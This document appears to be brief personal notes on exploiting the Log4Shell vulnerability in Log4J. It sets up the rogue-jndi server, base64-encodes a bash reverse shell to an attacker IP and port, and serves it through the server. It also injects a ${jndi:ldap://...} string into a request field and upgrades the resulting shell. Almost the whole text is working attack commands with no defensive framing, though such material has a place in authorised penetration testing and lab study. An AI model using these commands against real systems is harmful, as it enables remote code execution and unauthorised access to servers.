# Log4J
## Introduction

## Requirements
```bash
apt update
apt install openjdk-11-jdk -y
apt-get install maven
mvn -v
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi  
mvn package
```

## Pass the payload
Use the rogue-jdni server to pass a payload. First base64 encode the reverse shell payload.
```bash
echo 'bash -c bash -i >&/dev/tcp/$IP$/$PORT 0>&1' |  
base64
```
Then within the `rogue-jndi` directory.
```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo, $ENCODEDPAYLOAD} | {base64,-d}|{bash,-i}" --hostname "$IP"
```

Post response set "vulnerable parametre to:
Note: port 1389 is the rogue-jndi server
```json
{
	vuln:"${jndi:ldap://$IP:1389/o=tomcat}",
}
```
Upgrade th terminal shell:
```bash
script /dev/null -c bash
```
